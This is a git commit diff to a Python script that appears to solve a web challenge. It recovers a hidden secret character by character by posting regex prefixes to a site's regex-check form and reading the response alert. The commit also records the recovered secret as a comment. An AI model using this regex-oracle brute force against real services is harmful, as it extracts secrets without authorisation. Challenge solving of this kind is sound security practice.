4585d86352b2020323e21854a938ca20e0b04409
ramziChbl <ramzy.chbl@gmail.com>
2020-11-13 15:04:51 +0100

    added Secret

--- PasswordChecker.py
+++ PasswordChecker.py
@@ -1,4 +1,6 @@
 #!/usr/bin/python3
+# Secret = "Y0U_Sh0uld_V0te_but_Pl3asE_Dont-V0TE_TRUMP!!-_-"
+
 import requests
 from bs4 import BeautifulSoup
 from string import ascii_lowercase, ascii_uppercase
@@ -10,7 +12,6 @@ def checkRegex(regex):
 	data = {'regexCheck' : regexInput}
 	queryResult = requests.post(URL, data)
 	page = queryResult.content
-	#print(page)
 
 	soup = BeautifulSoup(page, 'html.parser')
 	resultDiv = soup.find('div', class_='alert')
@@ -19,15 +20,15 @@ def checkRegex(regex):
 	else:
 		return None
 
-
-URL = 'https://learn-gcp-286602.uc.r.appspot.com/'
+# Password size and possible characters were found by doing quick manual inputs
+passwordSize = 47
+possibleCharacters = ['[a-z]', '[A-Z]', '[0-9]', '_', '-', '!']
 
 passwordList = []
 #passwordList = ['Y', '0', 'U']
 #passwordList = ['Y', '0', 'U', '_', 'S', 'h', '0', 'u', 'l', 'd', '_', 'V', '0', 't', 'e', '_', 'b', 'u', 't', '_', 'P', 'l', '3', 'a', 's', 'E', '_', 'D', 'o', 'n', 't', '-', 'V', '0', 'T', 'E', '_', 'T', 'R', 'U', 'M', 'P', '!', '!', '-', '_', '-']
 
-for position in range(len(passwordList), 47):
-	possibleCharacters = ['[a-z]', '[A-Z]', '[0-9]', '_', '-', '!']
+for position in range(len(passwordList), passwordSize):
 	password = ''.join(passwordList)
 	for charType in possibleCharacters:
 		regexInput = '^{}{}'.format(password, charType)
